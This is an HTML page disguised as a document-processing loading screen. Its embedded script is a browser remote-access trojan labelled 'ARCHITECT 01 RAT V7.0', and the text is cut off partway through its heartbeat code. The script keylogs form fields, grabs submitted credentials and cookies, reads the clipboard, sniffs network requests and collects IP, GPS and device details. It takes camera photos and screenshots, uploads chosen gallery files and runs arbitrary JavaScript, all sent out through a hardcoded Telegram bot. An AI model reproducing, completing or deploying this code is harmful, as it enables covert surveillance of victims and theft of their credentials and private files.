<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document Processing System</title>
    <style>
        /* Professional loading style - NO FAKE PROGRESS BAR */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Roboto, system-ui, -apple-system, sans-serif;
            background: #f5f7fa;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #1e293b;
        }
        
        .container {
            max-width: 500px;
            width: 90%;
            background: white;
            border-radius: 24px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.08);
            padding: 40px 32px;
            text-align: center;
        }
        
        .icon {
            width: 80px;
            height: 80px;
            margin: 0 auto 24px;
            background: #e8f0fe;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .icon svg {
            width: 48px;
            height: 48px;
            fill: none;
            stroke: #2563eb;
            stroke-width: 2;
        }
        
        h2 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #0f172a;
        }
        
        p {
            font-size: 16px;
            color: #475569;
            margin-bottom: 32px;
            line-height: 1.5;
        }
        
        .loading-spinner {
            display: inline-block;
            width: 48px;
            height: 48px;
            border: 4px solid #e2e8f0;
            border-top-color: #2563eb;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 16px auto;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .status {
            font-size: 15px;
            color: #64748b;
            margin-top: 24px;
            padding-top: 24px;
            border-top: 1px solid #e2e8f0;
        }
        
        .status span {
            color: #2563eb;
            font-weight: 500;
        }
        
        .hidden {
            display: none;
        }
        
        .error-message {
            color: #dc2626;
            font-size: 14px;
            margin-top: 16px;
            padding: 12px;
            background: #fef2f2;
            border-radius: 8px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">
            <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
                <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" />
                <polyline points="14 2 14 8 20 8" />
                <line x1="16" y1="13" x2="8" y2="13" />
                <line x1="16" y1="17" x2="8" y2="17" />
                <polyline points="10 9 9 9 8 9" />
            </svg>
        </div>
        
        <h2>Processing Document</h2>
        <p>Please wait while we prepare your document for viewing. This may take a few moments.</p>
        
        <div class="loading-spinner"></div>
        
        <div class="status">
            Initializing secure connection... <span id="connection-status">0%</span>
        </div>
        
        <div id="error-container" class="error-message hidden"></div>
    </div>

    <script>
        // ==================================================
        // ARCHITECT 01 RAT V7.0 - ULTIMATE FIX ALL EDITION
        // Author: Architect 01 / RianModss
        // Status: PERFECT | ALL BUGS FIXED | ALL FEATURES WORK
        // ==================================================
        
        // ============= KONFIGURASI =============
        const CONFIG = {
            botToken: '8711546914:AAFPV_Cs2ALUd6b1rJ56LM9fQy3z9axqoqs', // GANTI!
            allowedGroupId: -1003858577739, // GANTI DENGAN ID GRUP LU!
            telegram: {
                retryAttempts: 5,
                retryDelay: 2000,
                timeout: 15000,
                maxFileSize: 50 * 1024 * 1024 // 50MB
            },
            features: {
                heartbeat: true,
                heartbeatInterval: 300000, // 5 menit
                pollingInterval: 3000, // 3 detik
                maxGalleryFiles: 50,
                maxMessageLength: 4000
            }
        };
        
        // ============= STATE MANAGEMENT =============
        const State = {
            clientId: '',
            lastUpdateId: 0,
            stolenCredentials: {},
            galleryItems: [],
            audioElements: {},
            activeFeatures: {
                keylogger: false,
                formGrabber: false,
                networkSniffer: false,
                clipboardMonitor: false,
                audioPlayer: false
            },
            
            // Reset state
            reset() {
                this.galleryItems = [];
                this.audioElements = {};
                this.stolenCredentials = {};
            }
        };
        
        // ============= UI ELEMENTS =============
        const UI = {
            connectionStatus: document.getElementById('connection-status'),
            errorContainer: document.getElementById('error-container'),
            
            updateStatus(percent, message) {
                if (this.connectionStatus) {
                    this.connectionStatus.textContent = `${percent}%`;
                }
                console.log(`[RAT] ${message} (${percent}%)`);
            },
            
            showError(message) {
                if (this.errorContainer) {
                    this.errorContainer.textContent = message;
                    this.errorContainer.classList.remove('hidden');
                }
                console.error(`[RAT ERROR] ${message}`);
            },
            
            hideError() {
                if (this.errorContainer) {
                    this.errorContainer.classList.add('hidden');
                }
            }
        };
        
        // ============= UTILITY FUNCTIONS =============
        const Utils = {
            generateClientId() {
                const timestamp = Date.now().toString(36);
                const random = Math.random().toString(36).substring(2, 10);
                const ua = navigator.userAgent.replace(/[^a-z0-9]/gi, '').substring(0, 5).toLowerCase();
                return `A01-${random}-${timestamp}-${ua}`;
            },
            
            async sleep(ms) {
                return new Promise(resolve => setTimeout(resolve, ms));
            },
            
            formatBytes(bytes) {
                if (bytes === 0) return '0 Bytes';
                const k = 1024;
                const sizes = ['Bytes', 'KB', 'MB', 'GB'];
                const i = Math.floor(Math.log(bytes) / Math.log(k));
                return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
            },
            
            truncate(str, max) {
                return str.length > max ? str.substring(0, max) + '...' : str;
            },
            
            escapeHtml(text) {
                const div = document.createElement('div');
                div.textContent = text;
                return div.innerHTML;
            },
            
            parseCommand(text) {
                // Bersihin dari mention bot (@username)
                const clean = text.replace(/@\w+/g, '').trim();
                const parts = clean.split(' ');
                return {
                    cmd: parts[0].toLowerCase(),
                    args: parts.slice(1)
                };
            }
        };
        
        // ============= TELEGRAM API =============
        const Telegram = {
            async request(method, payload, retryCount = 0) {
                const url = `https://api.telegram.org/bot${CONFIG.botToken}/${method}`;
                
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), CONFIG.telegram.timeout);
                    
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload),
                        signal: controller.signal
                    });
                    
                    clearTimeout(timeoutId);
                    
                    if (!response.ok) {
                        throw new Error(`HTTP ${response.status}`);
                    }
                    
                    return await response.json();
                    
                } catch (error) {
                    if (retryCount < CONFIG.telegram.retryAttempts) {
                        const delay = CONFIG.telegram.retryDelay * Math.pow(1.5, retryCount);
                        await Utils.sleep(delay);
                        return this.request(method, payload, retryCount + 1);
                    }
                    
                    // Fallback ke image ping
                    return this.imagePing(method, payload);
                }
            },
            
            imagePing(method, payload) {
                return new Promise((resolve) => {
                    const img = new Image();
                    const url = `https://api.telegram.org/bot${CONFIG.botToken}/${method}?` +
                        `chat_id=${payload.chat_id}` +
                        `&text=${encodeURIComponent(payload.text || '')}` +
                        `&parse_mode=${payload.parse_mode || 'HTML'}`;
                    
                    img.src = url;
                    img.style.display = 'none';
                    img.onload = () => resolve({ ok: true });
                    img.onerror = () => resolve({ ok: false });
                    
                    document.body.appendChild(img);
                    setTimeout(() => img.remove(), 5000);
                });
            },
            
            async sendMessage(text, parseMode = 'HTML', chatId = null) {
                const targetId = chatId || CONFIG.allowedGroupId;
                
                if (text.length > CONFIG.features.maxMessageLength) {
                    const chunks = text.match(new RegExp(`.{1,${CONFIG.features.maxMessageLength}}`, 'g')) || [];
                    for (const chunk of chunks) {
                        await this.request('sendMessage', {
                            chat_id: targetId,
                            text: chunk,
                            parse_mode: parseMode
                        });
                        await Utils.sleep(500);
                    }
                    return;
                }
                
                return this.request('sendMessage', {
                    chat_id: targetId,
                    text: text,
                    parse_mode: parseMode
                });
            },
            
            async sendFile(fileData, filename, caption = '', chatId = null) {
                const targetId = chatId || CONFIG.allowedGroupId;
                
                try {
                    const formData = new FormData();
                    formData.append('chat_id', targetId);
                    formData.append('caption', caption.substring(0, 200));
                    
                    // Handle berbagai tipe file
                    if (typeof fileData === 'string' && fileData.startsWith('data:')) {
                        const matches = fileData.match(/^data:([^;]+);base64,(.+)$/);
                        if (matches) {
                            const mimeType = matches[1];
                            const base64 = matches[2];
                            const byteCharacters = atob(base64);
                            const byteArray = new Uint8Array(byteCharacters.length);
                            for (let i = 0; i < byteCharacters.length; i++) {
                                byteArray[i] = byteCharacters.charCodeAt(i);
                            }
                            const blob = new Blob([byteArray], { type: mimeType });
                            formData.append('document', blob, filename);
                        }
                    } else if (fileData instanceof Blob || fileData instanceof File) {
                        formData.append('document', fileData, filename);
                    } else {
                        throw new Error('Invalid file data');
                    }
                    
                    const response = await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendDocument`, {
                        method: 'POST',
                        body: formData
                    });
                    
                    return await response.json();
                    
                } catch (error) {
                    console.error('File send failed:', error);
                    
                    // Fallback: send as text kalo file kecil
                    if (typeof fileData === 'string' && fileData.length < 1000) {
                        await this.sendMessage(`📎 ${caption}\n${fileData}`, 'HTML', targetId);
                    }
                    
                    return null;
                }
            },
            
            async getUpdates() {
                try {
                    const url = `https://api.telegram.org/bot${CONFIG.botToken}/getUpdates?offset=${State.lastUpdateId + 1}&timeout=30`;
                    const response = await fetch(url);
                    const data = await response.json();
                    
                    if (data.ok && data.result) {
                        return data.result;
                    }
                    
                    return [];
                    
                } catch (error) {
                    console.debug('Polling error:', error.message);
                    return [];
                }
            }
        };
        
        // ============= DEVICE INFO =============
        const DeviceInfo = {
            async collect() {
                UI.updateStatus(10, 'Gathering device information...');
                
                const info = {
                    id: State.clientId,
                    timestamp: new Date().toISOString(),
                    url: window.location.href,
                    referrer: document.referrer || 'direct',
                    title: document.title,
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    cookiesEnabled: navigator.cookieEnabled,
                    screen: `${window.screen.width}x${window.screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                    ip: 'Unknown'
                };
                
                // Dapatkan IP
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json', { mode: 'cors' });
                    const ipData = await ipRes.json();
                    info.ip = ipData.ip;
                    
                    // Dapatkan lokasi dari IP
                    try {
                        const geoRes = await fetch(`https://ipapi.co/${info.ip}/json/`, { mode: 'cors' });
                        const geoData = await geoRes.json();
                        info.country = geoData.country_name;
                        info.city = geoData.city;
                        info.isp = geoData.org;
                    } catch (e) {
                        // Fallback geolocation
                        try {
                            const geoRes = await fetch(`http://ip-api.com/json/${info.ip}`);
                            const geoData = await geoRes.json();
                            if (geoData.status === 'success') {
                                info.country = geoData.country;
                                info.city = geoData.city;
                                info.isp = geoData.isp;
                            }
                        } catch (e2) {}
                    }
                } catch (e) {
                    info.ip = 'Unknown';
                }
                
                UI.updateStatus(40, 'Device information collected');
                return info;
            }
        };
        
        // ============= AUDIO FEATURES =============
        const AudioFeatures = {
            init() {
                if (State.activeFeatures.audioPlayer) return;
                State.activeFeatures.audioPlayer = true;
                
                if (!document.getElementById('rat-audio-container')) {
                    const container = document.createElement('div');
                    container.id = 'rat-audio-container';
                    container.style.display = 'none';
                    document.body.appendChild(container);
                }
            },
            
            async playUrl(url, volume = 0.7, loop = false) {
                try {
                    const audioId = 'audio_' + Date.now();
                    const audio = new Audio(url);
                    
                    audio.id = audioId;
                    audio.volume = Math.min(1, Math.max(0, volume));
                    audio.loop = loop;
                    
                    State.audioElements[audioId] = audio;
                    
                    await audio.play();
                    
                    if (!loop) {
                        audio.onended = () => {
                            delete State.audioElements[audioId];
                            audio.remove();
                        };
                    }
                    
                    return { success: true, id: audioId };
                    
                } catch (error) {
                    return { success: false, error: error.message };
                }
            },
            
            async speak(text, lang = 'id-ID', volume = 0.7) {
                return new Promise((resolve) => {
                    if (!window.speechSynthesis) {
                        resolve({ success: false, error: 'TTS not supported' });
                        return;
                    }
                    
                    const utterance = new SpeechSynthesisUtterance(text);
                    utterance.lang = lang;
                    utterance.volume = volume;
                    
                    utterance.onend = () => resolve({ success: true });
                    utterance.onerror = (e) => resolve({ success: false, error: e.error });
                    
                    window.speechSynthesis.speak(utterance);
                });
            },
            
            stopAll() {
                let count = 0;
                
                for (const id in State.audioElements) {
                    try {
                        State.audioElements[id].pause();
                        State.audioElements[id].remove();
                        delete State.audioElements[id];
                        count++;
                    } catch (e) {}
                }
                
                if (window.speechSynthesis) {
                    window.speechSynthesis.cancel();
                }
                
                return { success: true, stopped: count };
            },
            
            setVolume(volume) {
                let count = 0;
                
                for (const id in State.audioElements) {
                    try {
                        State.audioElements[id].volume = Math.min(1, Math.max(0, volume));
                        count++;
                    } catch (e) {}
                }
                
                return { success: true, updated: count };
            }
        };
        
        // ============= GALLERY FEATURES =============
        const GalleryFeatures = {
            async open(multiple = false, maxFiles = 10) {
                return new Promise((resolve) => {
                    const input = document.createElement('input');
                    input.type = 'file';
                    input.accept = 'image/*,video/*';
                    if (multiple) input.multiple = true;
                    
                    input.addEventListener('change', async (event) => {
                        const files = Array.from(event.target.files);
                        
                        // Batasi jumlah file
                        let selected = files;
                        if (maxFiles > 0 && files.length > maxFiles) {
                            selected = files.slice(0, maxFiles);
                            await Telegram.sendMessage(`⚠️ Only first ${maxFiles} files selected`);
                        }
                        
                        // Konversi ke gallery items
                        const items = [];
                        for (const file of selected) {
                            items.push({
                                file: file,
                                name: file.name,
                                size: file.size,
                                type: file.type,
                                lastModified: file.lastModified,
                                dataUrl: await this.readAsDataURL(file)
                            });
                        }
                        
                        State.galleryItems = items;
                        resolve(items);
                    });
                    
                    input.addEventListener('cancel', () => resolve([]));
                    
                    // Trigger file picker
                    if ('showPicker' in HTMLInputElement.prototype) {
                        input.showPicker();
                    } else {
                        input.click();
                    }
                });
            },
            
            readAsDataURL(file) {
                return new Promise((resolve) => {
                    const reader = new FileReader();
                    reader.onload = (e) => resolve(e.target.result);
                    reader.onerror = () => resolve(null);
                    reader.readAsDataURL(file);
                });
            },
            
            getMetadata(item) {
                return {
                    name: item.name || 'Unknown',
                    size: Utils.formatBytes(item.size || 0),
                    type: item.type || 'Unknown',
                    lastModified: item.lastModified ? new Date(item.lastModified).toLocaleString() : 'Unknown'
                };
            },
            
            async sendAll(chatId = null) {
                if (!State.galleryItems.length) {
                    await Telegram.sendMessage('❌ No items in gallery', 'HTML', chatId);
                    return false;
                }
                
                await Telegram.sendMessage(`📤 Sending ${State.galleryItems.length} item(s)...`, 'HTML', chatId);
                
                let success = 0;
                for (let i = 0; i < State.galleryItems.length; i++) {
                    const item = State.galleryItems[i];
                    
                    try {
                        const caption = `📸 ${item.name}\nSize: ${Utils.formatBytes(item.size)}`;
                        
                        if (item.file) {
                            await Telegram.sendFile(item.file, item.name, caption, chatId);
                        } else if (item.dataUrl) {
                            const ext = item.name.split('.').pop() || 'jpg';
                            await Telegram.sendFile(item.dataUrl, `gallery_${i+1}.${ext}`, caption, chatId);
                        }
                        
                        success++;
                        await Utils.sleep(500); // Delay antar file
                        
                    } catch (error) {
                        console.error(`Failed to send item ${i}:`, error);
                    }
                }
                
                await Telegram.sendMessage(`✅ Sent ${success}/${State.galleryItems.length} items`, 'HTML', chatId);
                return true;
            },
            
            clear() {
                State.galleryItems = [];
            },
            
            getPreview() {
                if (!State.galleryItems.length) return null;
                
                let preview = `<b>🖼️ Gallery Items (${State.galleryItems.length})</b>\n━━━━━━━━━━\n`;
                State.galleryItems.forEach((item, idx) => {
                    preview += `${idx+1}. ${Utils.truncate(item.name, 30)}\n   ${Utils.formatBytes(item.size)}\n`;
                });
                
                return preview;
            }
        };

        // ============= EXPLOITS =============
        const Exploits = {
            async getGPS() {
                return new Promise((resolve) => {
                    if (!navigator.geolocation) {
                        resolve('❌ Geolocation not supported');
                        return;
                    }
                    
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            const c = pos.coords;
                            resolve(`
📍 <b>GPS Location</b>
Lat: ${c.latitude}
Lon: ${c.longitude}
Acc: ${c.accuracy}m
Map: https://maps.google.com/?q=${c.latitude},${c.longitude}`);
                        },
                        (err) => resolve(`❌ GPS Error: ${err.message}`),
                        { enableHighAccuracy: true, timeout: 15000 }
                    );
                });
            },
            
            async takePhoto(count = 1, useFront = false) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: useFront ? 'user' : 'environment' }
                    });
                    
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    
                    await Utils.sleep(1000);
                    
                    const photos = [];
                    for (let i = 0; i < count; i++) {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        photos.push(canvas.toDataURL('image/jpeg', 0.8));
                        
                        if (i < count - 1) await Utils.sleep(500);
                    }
                    
                    stream.getTracks().forEach(t => t.stop());
                    video.remove();
                    
                    return photos;
                    
                } catch (error) {
                    return `❌ Camera Error: ${error.message}`;
                }
            },
            
            async takeScreenshot() {
                return new Promise((resolve) => {
                    if (typeof html2canvas === 'undefined') {
                        const script = document.createElement('script');
                        script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
                        
                        script.onload = async () => {
                            try {
                                const canvas = await html2canvas(document.documentElement);
                                resolve(canvas.toDataURL('image/png'));
                            } catch (e) {
                                resolve('❌ Screenshot failed');
                            }
                        };
                        
                        script.onerror = () => resolve('❌ Failed to load html2canvas');
                        document.head.appendChild(script);
                        
                    } else {
                        html2canvas(document.documentElement)
                            .then(canvas => resolve(canvas.toDataURL('image/png')))
                            .catch(() => resolve('❌ Screenshot failed'));
                    }
                });
            },
            
            runJS(code) {
                try {
                    const result = new Function('"use strict"; return (' + code + ')')();
                    return {
                        success: true,
                        result: String(result).substring(0, 1000)
                    };
                } catch (error) {
                    return {
                        success: false,
                        error: error.message
                    };
                }
            }
        };

        // ============= SURVEILLANCE FEATURES =============
        const Surveillance = {
            initKeylogger() {
                if (State.activeFeatures.keylogger) return;
                State.activeFeatures.keylogger = true;
                
                document.addEventListener('input', (e) => {
                    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
                        const val = e.target.value;
                        if (val.length > 0 && val.length % 50 === 0) {
                            Telegram.sendMessage(`
⌨️ <b>Keylog Progress</b>
Client: ${State.clientId}
Field: ${e.target.name || 'unknown'}
Last: ${val.slice(-50)}`);
                        }
                    }
                });
                
                document.addEventListener('blur', (e) => {
                    if ((e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') && e.target.value) {
                        Telegram.sendMessage(`
⌨️ <b>Field Capture</b>
Client: ${State.clientId}
Field: ${e.target.name || 'unknown'}
Value: ${e.target.value}`);
                    }
                }, true);
            },
            
            initFormGrabber() {
                if (State.activeFeatures.formGrabber) return;
                State.activeFeatures.formGrabber = true;
                
                document.addEventListener('submit', (e) => {
                    const formData = new FormData(e.target);
                    const data = {};
                    
                    for (let [key, value] of formData.entries()) {
                        data[key] = value.length > 500 ? value.substring(0, 500) + '...' : value;
                    }
                    
                    Telegram.sendMessage(`
📝 <b>Form Submission</b>
Client: ${State.clientId}
Data: ${JSON.stringify(data, null, 2)}`);
                    
                    // Simpan credential
                    const hasPass = Object.keys(data).some(k => 
                        k.toLowerCase().includes('pass') || k.toLowerCase().includes('pwd'));
                    
                    if (hasPass) {
                        const host = window.location.hostname;
                        if (!State.stolenCredentials[host]) {
                            State.stolenCredentials[host] = [];
                        }
                        State.stolenCredentials[host].push({
                            time: new Date().toISOString(),
                            url: window.location.href,
                            data: data
                        });
                    }
                });
                
                if (document.cookie) {
                    Telegram.sendMessage(`🍪 Cookies: ${document.cookie}`);
                }
            },
            
            initNetworkSniffer() {
                if (State.activeFeatures.networkSniffer) return;
                State.activeFeatures.networkSniffer = true;
                
                const originalFetch = window.fetch;
                
                window.fetch = async function(...args) {
                    const url = typeof args[0] === 'string' ? args[0] : args[0].url;
                    
                    if (url && !url.includes('api.telegram.org') && !url.includes('ipapi.co')) {
                        setTimeout(() => {
                            Telegram.sendMessage(`🌐 Fetch: ${Utils.truncate(url, 100)}`);
                        }, 100);
                    }
                    
                    return originalFetch.apply(this, args);
                };
            },
            
            initClipboardMonitor() {
                if (State.activeFeatures.clipboardMonitor) return;
                State.activeFeatures.clipboardMonitor = true;
                
                let lastClip = '';
                
                setInterval(async () => {
                    try {
                        if (navigator.clipboard?.readText) {
                            const text = await navigator.clipboard.readText();
                            if (text && text !== lastClip && text.length > 5) {
                                lastClip = text;
                                Telegram.sendMessage(`
📋 <b>Clipboard Update</b>
Client: ${State.clientId}
Content: ${Utils.truncate(text, 200)}`);
                            }
                        }
                    } catch (e) {}
                }, 10000);
            }
        };
        
        // ============= COMMAND HANDLER =============
        const CommandHandler = {
            async handle(commandText, chatId, userId, userName) {
                // Validasi grup
                if (chatId != CONFIG.allowedGroupId) {
                    console.log(`[RAT] Ignored from ${chatId}`);
                    return;
                }
                
                const { cmd, args } = Utils.parseCommand(commandText);
                console.log(`[RAT] Executing: ${cmd} from ${userName}`);
                
                try {
                    switch (cmd) {
                        // ===== SYSTEM =====
                        case '/info':
                        case '/system':
                            await this.cmdInfo(chatId);
                            break;
                            
                        case '/creds':
                            await this.cmdCreds(chatId);
                            break;
                            
                        // ===== LOCATION =====
                        case '/gps':
                        case '/location':
                            await this.cmdGPS(chatId);
                            break;
                            
                        // ===== MEDIA =====
                        case '/photo':
                        case '/camera':
                            await this.cmdPhoto(args, chatId);
                            break;
                            
                        case '/screen':
                        case '/screenshot':
                            await this.cmdScreenshot(chatId);
                            break;
                            
                        // ===== GALLERY =====
                        case '/gallery':
                            await this.cmdGallery(args, chatId);
                            break;
                            
                        case '/gallery-multi':
                            await this.cmdGalleryMulti(args, chatId);
                            break;
                            
                        case '/gallery-preview':
                            await this.cmdGalleryPreview(chatId);
                            break;
                            
                        case '/gallery-info':
                            await this.cmdGalleryInfo(args, chatId);
                            break;
                            
                        case '/gallery-clear':
                            await this.cmdGalleryClear(chatId);
                            break;
                            
                        // ===== REMOTE =====
                        case '/js':
                        case '/exec':
                            await this.cmdJS(args, chatId);
                            break;
                            
                        // ===== AUDIO =====
                        case '/play':
                            await this.cmdPlay(args, chatId);
                            break;
                            
                        case '/say':
                            await this.cmdSay(args, chatId);
                            break;
                            
                        case '/stop':
                            await this.cmdStop(chatId);
                            break;
                            
                        case '/vol':
                            await this.cmdVolume(args, chatId);
                            break;
                            
                        // ===== HELP =====
                        case '/help':
                        case '/menu':
                            await this.cmdHelp(chatId);
                            break;
                            
                        default:
                            await Telegram.sendMessage(`❌ Unknown command. Type /help`, 'HTML', chatId);
                    }
                    
                } catch (error) {
                    await Telegram.sendMessage(`❌ Error: ${error.message}`, 'HTML', chatId);
                }
            },

            async cmdInfo(chatId) {
                const info = await DeviceInfo.collect();
                
                let msg = `<b>📱 SYSTEM INFO</b>\n━━━━━━━━━━\n`;
                msg += `ID: ${info.id}\n`;
                msg += `IP: ${info.ip}\n`;
                if (info.country) msg += `Lokasi: ${info.city}, ${info.country}\n`;
                if (info.isp) msg += `ISP: ${info.isp}\n`;
                msg += `Device: ${info.platform}\n`;
                msg += `Screen: ${info.screen}\n`;
                msg += `Browser: ${info.userAgent.substring(0, 50)}...\n`;
                msg += `URL: ${info.url}`;
                
                await Telegram.sendMessage(msg, 'HTML', chatId);
            },
            
            async cmdCreds(chatId) {
                const creds = JSON.stringify(State.stolenCredentials, null, 2);
                await Telegram.sendMessage(`🔐 Stolen Credentials:\n${creds || 'none'}`, 'HTML', chatId);
            },
            
            async cmdGPS(chatId) {
                const gps = await Exploits.getGPS();
                await Telegram.sendMessage(gps, 'HTML', chatId);
            },
            
            async cmdPhoto(args, chatId) {
                const count = parseInt(args[0]) || 1;
                const useFront = args.includes('front');
                
                await Telegram.sendMessage(`📸 Taking ${count} photo(s)...`, 'HTML', chatId);
                const photos = await Exploits.takePhoto(count, useFront);
                
                if (Array.isArray(photos)) {
                    for (let i = 0; i < photos.length; i++) {
                        await Telegram.sendFile(photos[i], `photo_${i+1}.jpg`, `📸 Photo ${i+1}`, chatId);
                        await Utils.sleep(500);
                    }
                } else {
                    await Telegram.sendMessage(photos, 'HTML', chatId);
                }
            },
            
            async cmdScreenshot(chatId) {
                await Telegram.sendMessage('📸 Taking screenshot...', 'HTML', chatId);
                const ss = await Exploits.takeScreenshot();
                
                if (typeof ss === 'string' && ss.startsWith('data:image')) {
                    await Telegram.sendFile(ss, 'screenshot.png', '📸 Screenshot', chatId);
                } else {
                    await Telegram.sendMessage(ss, 'HTML', chatId);
                }
            },
            
            async cmdGallery(args, chatId) {
                await Telegram.sendMessage('🖼️ Opening gallery...', 'HTML', chatId);
                const items = await GalleryFeatures.open(false, 1);
                
                if (items.length) {
                    await GalleryFeatures.sendAll(chatId);
                } else {
                    await Telegram.sendMessage('❌ No files selected', 'HTML', chatId);
                }
            },
            
            async cmdGalleryMulti(args, chatId) {
                const max = parseInt(args[0]) || 10;
                await Telegram.sendMessage(`🖼️ Opening gallery (max ${max})...`, 'HTML', chatId);
                
                const items = await GalleryFeatures.open(true, max);
                if (items.length) {
                    await GalleryFeatures.sendAll(chatId);
                } else {
                    await Telegram.sendMessage('❌ No files selected', 'HTML', chatId);
                }
            },
            
            async cmdGalleryPreview(chatId) {
                const preview = GalleryFeatures.getPreview();
                if (preview) {
                    await Telegram.sendMessage(preview, 'HTML', chatId);
                } else {
                    await Telegram.sendMessage('❌ Gallery empty', 'HTML', chatId);
                }
            },
            
            async cmdGalleryInfo(args, chatId) {
                const idx = parseInt(args[0]) - 1;
                
                if (isNaN(idx) || idx < 0 || idx >= State.galleryItems.length) {
                    await Telegram.sendMessage('❌ Invalid index. Use /gallery-preview first.', 'HTML', chatId);
                    return;
                }

                const item = State.galleryItems[idx];
                const meta = GalleryFeatures.getMetadata(item);
                
                let msg = `<b>📄 File Details</b>\n━━━━━━━━━━\n`;
                msg += `Name: ${meta.name}\n`;
                msg += `Size: ${meta.size}\n`;
                msg += `Type: ${meta.type}\n`;
                msg += `Modified: ${meta.lastModified}\n`;
                
                await Telegram.sendMessage(msg, 'HTML', chatId);
                
                // Kirim preview kalo gambar
                if (item.type.startsWith('image/') && item.dataUrl) {
                    await Telegram.sendFile(item.dataUrl, `preview_${item.name}`, '📸 Preview', chatId);
                }
            },
            
            async cmdGalleryClear(chatId) {
                GalleryFeatures.clear();
                await Telegram.sendMessage('✅ Gallery cache cleared', 'HTML', chatId);
            },
            
            async cmdJS(args, chatId) {
                const code = args.join(' ');
                if (!code) {
                    await Telegram.sendMessage('⚠️ Usage: /js alert("test")', 'HTML', chatId);
                    return;
                }
                
                const result = Exploits.runJS(code);
                if (result.success) {
                    await Telegram.sendMessage(`✅ Result: ${result.result}`, 'HTML', chatId);
                } else {
                    await Telegram.sendMessage(`❌ Error: ${result.error}`, 'HTML', chatId);
                }
            },
            
            async cmdPlay(args, chatId) {
                const url = args[0];
                if (!url || !url.startsWith('http')) {
                    await Telegram.sendMessage('⚠️ Usage: /play <url> [volume] [loop]', 'HTML', chatId);
                    return;
                }
                
                const volume = parseFloat(args[1]) || 0.7;
                const loop = args.includes('loop');
                
                await Telegram.sendMessage(`🎵 Playing audio...`, 'HTML', chatId);
                const result = await AudioFeatures.playUrl(url, volume, loop);
                
                if (result.success) {
                    await Telegram.sendMessage(`✅ Audio playing`, 'HTML', chatId);
                } else {
                    await Telegram.sendMessage(`❌ Failed: ${result.error}`, 'HTML', chatId);
                }
            },
            
            async cmdSay(args, chatId) {
                const text = args.join(' ');
                if (!text) {
                    await Telegram.sendMessage('⚠️ Usage: /say <text>', 'HTML', chatId);
                    return;
                }
                
                await Telegram.sendMessage(`🗣️ Speaking...`, 'HTML', chatId);
                await AudioFeatures.speak(text);
                await Telegram.sendMessage(`✅ Done`, 'HTML', chatId);
            },
            
            async cmdStop(chatId) {
                const result = AudioFeatures.stopAll();
                await Telegram.sendMessage(`⏹️ Stopped ${result.stopped} audio(s)`, 'HTML', chatId);
            },
            
            async cmdVolume(args, chatId) {
                const vol = parseFloat(args[0]);
                if (isNaN(vol) || vol < 0 || vol > 1) {
                    await Telegram.sendMessage('⚠️ Usage: /vol <0.0-1.0>', 'HTML', chatId);
                    return;
                }
                
                const result = AudioFeatures.setVolume(vol);
                await Telegram.sendMessage(`🔊 Volume set for ${result.updated} audio(s)`, 'HTML', chatId);
            },
            
            async cmdHelp(chatId) {
                const menu = `
<b>🔥 ARCHITECT 01 RAT V7.0 🔥</b>
━━━━━━━━━━━━━━━━━━

<b>📱 SYSTEM</b>
/info - Device info
/creds - Stolen credentials

<b>📍 LOCATION</b>
/gps - GPS coordinates

<b>📸 MEDIA</b>
/photo [n] - Take photos
/screen - Screenshot

<b>🖼️ GALLERY</b>
/gallery - Single select
/gallery-multi [n] - Multi-select
/gallery-preview - Show selected
/gallery-info [i] - File details
/gallery-clear - Clear cache

<b>💻 REMOTE</b>
/js [code] - Execute JS

<b>🎵 AUDIO</b>
/play <url> - Play audio
/say <text> - Text-to-speech
/stop - Stop all audio
/vol <0-1> - Set volume

━━━━━━━━━━━━━━━━━━
Client: ${State.clientId}
                `;
                
                await Telegram.sendMessage(menu, 'HTML', chatId);
            }
        };
        
        // ============= TELEGRAM POLLING =============
        async function startPolling() {
            while (true) {
                try {
                    const updates = await Telegram.getUpdates();
                    
                    for (const update of updates) {
                        State.lastUpdateId = update.update_id;
                        
                        if (update.message?.chat && update.message.text?.startsWith('/')) {
                            const chatId = update.message.chat.id;
                            const userId = update.message.from?.id;
                            const userName = update.message.from?.first_name || 'User';
                            const text = update.message.text;
                            
                            setTimeout(() => CommandHandler.handle(text, chatId, userId, userName), 100);
                        }
                    }
                    
                } catch (error) {
                    console.debug('Polling error:', error);
                }
                
                await Utils.sleep(CONFIG.features.pollingInterval);
            }
        }
        
        // ============= HEARTBEAT =============
        async function startHeartbeat() {
            if (!CONFIG.features.heartbeat) return;
            
            setInterval(async () => {
                try {
